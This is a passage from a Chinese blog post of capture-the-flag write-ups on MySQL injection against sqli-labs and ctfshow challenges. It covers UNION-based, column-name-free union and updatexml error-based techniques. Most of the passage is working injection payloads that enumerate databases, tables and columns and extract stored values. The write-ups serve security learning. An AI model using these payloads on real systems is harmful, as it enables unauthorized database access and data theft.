<span class="token comment">-- 查询id, flag43s字段的值</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<hr>
<h2 id="sqli-labs-less-2（数字型）"><a href="#sqli-labs-less-2（数字型）" class="headerlink" title="sqli-labs less-2（数字型）"></a>sqli-labs less-2（数字型）</h2><p>ctfshow web518</p>
<p>测试 <code>1&#39;</code> 和 <code>1&quot;</code> 均会报错，<code>1&#39;</code>时报错回显的部分sql语句是<code>&#39; LIMIT 0,1</code></p>
<p>和上面对比可知这里没有用引号闭合，应该是数字型注入</p>
<p>数字型的测试语句：</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token number">1</span> <span class="token operator">and</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span><span class="token comment">--+</span>
<span class="token number">1</span> <span class="token operator">and</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">2</span><span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>前者会正常回显 id&#x3D;1 的内容，后者会导致查询结果为空，这里没有回显内容</p>
<p><img src="/blog/2023/03/16/mysql%E6%B3%A8%E5%85%A5/image-20250415092040878.png" alt="image-20250415092040878"></p>
<p><img src="/blog/2023/03/16/mysql%E6%B3%A8%E5%85%A5/image-20250415092059489.png" alt="image-20250415092059489"></p>
<p>那么按照流程进行注入即可</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token number">1</span> <span class="token keyword">order</span> <span class="token keyword">by</span> <span class="token number">3</span><span class="token comment">--+</span>
<span class="token number">1</span> <span class="token keyword">order</span> <span class="token keyword">by</span> <span class="token number">4</span><span class="token comment">--+</span>
<span class="token comment">-- 此时产生报错，说明查询3列</span>

<span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token comment">--+</span>
<span class="token comment">-- 页面返回2，3，说明回显到前端的是第2列和第3列</span>

<span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span>SCHEMA_NAME<span class="token punctuation">,</span><span class="token number">3</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span>SCHEMATA<span class="token comment">--+</span>
<span class="token comment">-- 查询数据库名，这里得到ctfshow</span>

<span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">3</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token string">'ctfshow'</span><span class="token comment">--+</span>
<span class="token comment">-- 查询表名，这里得到flagaa</span>

<span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">3</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token string">'ctfshow'</span> <span class="token operator">and</span> table_name<span class="token operator">=</span><span class="token string">'flagaa'</span><span class="token comment">--+</span>
<span class="token comment">-- 查询列名，这里得到id, flagac</span>

<span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>id<span class="token punctuation">,</span><span class="token string">'--'</span><span class="token punctuation">,</span>flagac<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">3</span> <span class="token keyword">from</span> ctfshow<span class="token punctuation">.</span>flagaa <span class="token comment">--+</span>
<span class="token comment">-- 查询id, flagac字段的值</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<hr>
<h2 id="sqli-labs-less-3-amp-4-amp-12（更多闭合类型）"><a href="#sqli-labs-less-3-amp-4-amp-12（更多闭合类型）" class="headerlink" title="sqli-labs less-3&amp;4&amp;12（更多闭合类型）"></a>sqli-labs less-3&amp;4&amp;12（更多闭合类型）</h2><p>less-3（ctfshow web519）</p>
<p>输入 <code>1&#39;</code>，报错返回的部分语句是<code>&#39;1&#39;&#39;) LIMIT 0,1</code>，说明闭合方式应该是<code>&#39;)</code></p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token number">1</span><span class="token string">')order by 3--+
1'</span><span class="token punctuation">)</span><span class="token keyword">order</span> <span class="token keyword">by</span> <span class="token number">4</span><span class="token comment">--+</span>
<span class="token operator">-</span><span class="token number">1</span><span class="token string">') union select 1,2,3--+
-1'</span><span class="token punctuation">)</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span>SCHEMA_NAME<span class="token punctuation">,</span><span class="token number">3</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span>SCHEMATA<span class="token comment">--+</span>
<span class="token operator">-</span><span class="token number">1</span><span class="token string">') union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='</span>ctfshow<span class="token string">'--+
-1'</span><span class="token punctuation">)</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">3</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token string">'ctfshow'</span> <span class="token operator">and</span> table_name<span class="token operator">=</span><span class="token string">'flagaanec'</span><span class="token comment">--+</span>
<span class="token operator">-</span><span class="token number">1</span><span class="token string">') union select 1,group_concat(id,'</span><span class="token comment">--',flagaca),3 from ctfshow.flagaanec --+</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>less-4（ctfshow web520）</p>
<p>输入<code>1&quot;</code>，报错返回部分语句：<code>&quot;1&quot;&quot;) LIMIT 0,1</code>，闭合方式是<code>&quot;)</code>，和上面一样，打法不赘述了</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token operator">-</span><span class="token number">1</span>"<span class="token punctuation">)</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>id<span class="token punctuation">,</span><span class="token string">'--'</span><span class="token punctuation">,</span>flag23<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">3</span> <span class="token keyword">from</span> ctfshow<span class="token punctuation">.</span>flagsf <span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>less-12（ctfshow web528）POST传参，<code>1&quot;)</code>闭合</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token operator">-</span><span class="token number">1</span><span class="token string">") union select 1,group_concat(table_name) from information_schema.tables where table_schema='ctfshow'#
-1"</span><span class="token punctuation">)</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token string">'ctfshow'</span> <span class="token operator">and</span> table_name<span class="token operator">=</span><span class="token string">'flagugsds'</span><span class="token comment">#</span>
<span class="token operator">-</span><span class="token number">1</span>"<span class="token punctuation">)</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>id<span class="token punctuation">,</span><span class="token string">'--'</span><span class="token punctuation">,</span>flag43as<span class="token punctuation">)</span> <span class="token keyword">from</span> ctfshow<span class="token punctuation">.</span>flagugsds<span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<hr>
<h2 id="无列名联合注入"><a href="#无列名联合注入" class="headerlink" title="无列名联合注入"></a>无列名联合注入</h2><p><a target="_blank" rel="noopener" href="https://web.archive.org/web/20220628010134/http://www.poluoluo.com/server/201706/547394.html">https://web.archive.org/web/20220628010134/http://www.poluoluo.com/server/201706/547394.html</a></p>
<p>限制环境：存放 flag 的字段名未知，information_schema.columns 也将表名的 hex 过滤了，即获取不到字段名</p>
<p>已知查询的列数和表名，这里假设为3</p>
<p>用别名<code>(select 1)a,(select 2)b,(select 3)c</code>构造出一个表</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">)</span>a<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">2</span><span class="token punctuation">)</span>b<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">3</span><span class="token punctuation">)</span>c<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/blog/2023/03/16/mysql%E6%B3%A8%E5%85%A5/image-20250416000504938.png" alt="image-20250416000504938"></p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">)</span>a<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">2</span><span class="token punctuation">)</span>b<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">3</span><span class="token punctuation">)</span>c<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/blog/2023/03/16/mysql%E6%B3%A8%E5%85%A5/image-20250416001731484.png" alt="image-20250416001731484"></p>
<p>此时这个表的列名就是1，2，3</p>
<p>通过联合查询，把别名表和目标表拼到一起</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">)</span>a<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">2</span><span class="token punctuation">)</span>b<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">3</span><span class="token punctuation">)</span>c <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token keyword">user</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/blog/2023/03/16/mysql%E6%B3%A8%E5%85%A5/image-20250416000524453.png" alt="image-20250416000524453"></p>
<p>然后利用别名再把拼接后的表视为表 d，此时表 d 的列名就是 1，2，3，查询 d 表的 3 列</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> d<span class="token punctuation">.</span><span class="token number">3</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">)</span>a<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">2</span><span class="token punctuation">)</span>b<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">3</span><span class="token punctuation">)</span>c <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token keyword">user</span><span class="token punctuation">)</span>d<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/blog/2023/03/16/mysql%E6%B3%A8%E5%85%A5/image-20250416000700057.png" alt="image-20250416000700057"></p>
<p>加上 <code>limit</code> 就能实现对单个记录的遍历</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> d<span class="token punctuation">.</span><span class="token number">3</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">)</span>a<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">2</span><span class="token punctuation">)</span>b<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">3</span><span class="token punctuation">)</span>c <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token keyword">user</span><span class="token punctuation">)</span>d <span class="token keyword">limit</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/blog/2023/03/16/mysql%E6%B3%A8%E5%85%A5/image-20250416001141008.png" alt="image-20250416001141008"></p>
<p>再联合查询套一层别名子查询</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token keyword">user</span> <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token punctuation">(</span><span class="token keyword">select</span> d<span class="token punctuation">.</span><span class="token number">3</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">)</span>a<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">2</span><span class="token punctuation">)</span>b<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">3</span><span class="token punctuation">)</span>c <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token keyword">user</span><span class="token punctuation">)</span>d <span class="token keyword">limit</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span>e<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">)</span>f<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">)</span>g<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/blog/2023/03/16/mysql%E6%B3%A8%E5%85%A5/image-20250416002101851.png" alt="image-20250416002101851"></p>
<p>由此可以还原出 id&#x3D;1 整行的内容</p>
<hr>
<h1 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h1><h2 id="数据库报错"><a href="#数据库报错" class="headerlink" title="数据库报错"></a>数据库报错</h2><p>在 PHP 中，<code>mysqli_error()</code> 和 <code>mysqli_connect_error()</code> 是与 MySQL 数据库交互时用于获取错误信息的两个函数（PHP5 下还有<code>mysql_error()</code>，mysql 与 mysqli 的区别是连接是否持久，后者会提供永久连接的功能）</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">mysqli_error</span><span class="token punctuation">(</span><span class="token variable">$link</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// 用于获取最近一次 MySQL 操作中发生的错误信息</span>

<span class="token function">mysqli_connect_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// 只与最近一次调用 mysqli_connect() 或 mysqli_real_connect() 时的连接错误相关</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>如果数据库的查询结果不会回显在前端，但是使用了 <code>mysqli_error</code> 会返回报错信息的函数，那么可以专门构造让 sql 出现报错的语句，在其中额外执行查询来实现获取信息</p>
<p>注：报错长度最长是32，所以要用<code>substr</code>或者<code>substring</code>或者<code>not in</code>等函数去截取</p>
<h2 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml"></a>updatexml</h2><blockquote>
<p>用于修改XML字符串中与指定XPath表达式匹配的部分，并返回修改后的XML</p>
</blockquote>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> UPDATEXML<span class="token punctuation">(</span><span class="token string">'&lt;root>&lt;item>value&lt;/item>&lt;/root>'</span><span class="token punctuation">,</span> <span class="token string">'/root/item'</span><span class="token punctuation">,</span> <span class="token string">'new_value'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/blog/2023/03/16/mysql%E6%B3%A8%E5%85%A5/image-20250415102340547.png" alt="image-20250415102340547"></p>
<p>这里 XPath 表达式 <code>/root/item</code> 匹配到了<code>&lt;root&gt; </code>下的 <code>&lt;item&gt;</code> 节点，于是会将这个节点及其节点下的内容修改为 new_value</p>
<p>但是如果我们输入一个不符合 XPath 语法的表达式呢？</p>
<p><img src="/blog/2023/03/16/mysql%E6%B3%A8%E5%85%A5/image-20250415103457032.png" alt="image-20250415103457032"></p>
<p>可以看到这里会报错并带出第二个参数的信息</p>
<p>而 MYSQL 中支持<strong>子查询</strong>：</p>
<blockquote>
<p>在 MySQL 中，SELECT 子查询是一种嵌套查询技术，用于在一个查询中嵌套另一个查询。子查询可以作为主查询的一部分，提供数据以供主查询使用。子查询通常用于提高查询的灵活性和复杂性。</p>
</blockquote>
<p>在 SELECT 子句中：子查询会返回一个值，然后用于主查询使用</p>
<p><img src="/blog/2023/03/16/mysql%E6%B3%A8%E5%85%A5/image-20250415103956988.png" alt="image-20250415103956988"></p>
<p>那么我们可以将子查询的结果和非 XPath 语法的字符用 <strong>concat</strong> 方法拼接在一起，然后放在 updatexml 方法的第二个参数，通过报错带出查询内容的回显</p>
<blockquote>
<p><code>CONCAT()</code> 是 MySQL 中的字符串函数，用于将两个或多个列的值拼接成一个字符串<br>返回结果为所有输入字符串的拼接结果</p>
</blockquote>
<p>构造payload：</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">updatexml<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token string">'^'</span><span class="token punctuation">,</span><span class="token punctuation">(</span>需要查询的内容<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'^'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/blog/2023/03/16/mysql%E6%B3%A8%E5%85%A5/image-20250415104515025.png" alt="image-20250415104515025"></p>
<hr>
<h3 id="sqli-labs-less-5-amp-6"><a href="#sqli-labs-less-5-amp-6" class="headerlink" title="sqli-labs less-5&amp;6"></a>sqli-labs less-5&amp;6</h3><p>ctfshow web521-522</p>
<p>本题中，参数 id 传入任何数字都会返回固定的字符串 <code>  You are in...........</code></p>
<p>但是 <code>1&#39;</code> 依旧会正常报错<code>&#39;1&#39;&#39; LIMIT 0,1</code>，说明是单引号闭合，那么尝试使用报错注入带出回显</p>
<ul>
<li><p>查数据库名：</p>
<p>注意查询 SCHEMA_NAME 会返回多行结果，这里需要主动使用 <strong>limit</strong> 方法限制查询返回的记录数，也可以用<code>group_concat(SCHEMA_NAME)</code>把记录集中在一行，但是 updatexml 最多回显32个字符，所以还需要 <code>substr</code> 进行截取</p>
<blockquote>
<p>在 MySQL 中，LIMIT 关键字用于限制 SQL 查询结果集中返回的记录数，通常用于分页查询、大量数据的截取以及提高查询效率</p>
</blockquote>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> employees <span class="token keyword">LIMIT</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">;</span>
<span class="token comment">-- 跳过前 10 条记录，从第 11 条记录开始，返回 5 条记录。第一个参数 10 是偏移量（可省略，省略时从第0条记录算起），第二个参数 5 是返回的记录数。</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>构造 payload：</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token number">1</span><span class="token string">' and updatexml(1,concat(0x7e,(select SCHEMA_NAME from information_schema.SCHEMATA limit 0,1),0x7e),1)--+

或
1'</span> <span class="token operator">and</span> updatexml<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span>substr<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>SCHEMA_NAME<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span>SCHEMATA<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="/blog/2023/03/16/mysql%E6%B3%A8%E5%85%A5/image-20250415105539147.png" alt="image-20250415105539147"></p>
<p>数据库ctfshow</p>
</li>
<li><p>查表名：</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token number">1</span><span class="token string">' and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='</span>ctfshow'<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>得到 flagpuck 表</p>
</li>
<li><p>查列名：</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token number">1</span><span class="token string">' and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema='</span>ctfshow<span class="token string">' and table_name='</span>flagpuck'<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>得到 id, flag33 列</p>
</li>
<li><p>查字段：</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token number">1</span><span class="token string">' and updatexml(1,concat(0x7e,substr((select group_concat(flag33) from ctfshow.flagpuck),1,32),0x7e),1)--+
1'</span> <span class="token operator">and</span> updatexml<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span>substr<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>flag33<span class="token punctuation">)</span> <span class="token keyword">from</span> ctfshow<span class="token punctuation">.</span>flagpuck<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li>
</ul>
<p>less-6 闭合方式为 <code>1&quot;</code>，其余不变</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token number">1</span><span class="token string">" and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='ctfshow'),0x7e),1)--+

1"</span> <span class="token operator">and</span> updatexml<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token string">'ctfshow'</span> <span class="token operator">and</span> table_name<span class="token operator">=</span><span class="token string">'flagpa'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment">--+</span>

<span class="token number">1</span><span class="token string">" and updatexml(1,concat(0x7e,substr((select group_concat(flag3a3) from ctfshow.flagpa),1,32),0x7e),1)--+
1"</span> <span class="token operator">and</span> updatexml<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span>substr<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>flag3a3<span class="token punctuation">)</span> <span class="token keyword">from</span> ctfshow<span class="token punctuation">.</span>flagpa<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<hr>
<h3 id="ctfshow-web244"><a href="#ctfshow-web244" class="headerlink" title="ctfshow web244"></a>ctfshow web244</h3><p>查数据库名</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">1</span>' <span class="token operator">and</span> updatexml<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/blog/2023/03/16/mysql%E6%B3%A8%E5%85%A5/image-20230819174515576.png" alt="image-20230819174515576"></p>
<p>查表名</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">1</span>' <span class="token operator">and</span> updatexml<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>查列名</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">1</span><span class="token string">' and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='</span>ctfshow_flag'<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>查字段</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">1</span>' <span class="token operator">and</span> updatexml<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> flag <span class="token keyword">from</span> ctfshow_flag<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>截取</p>
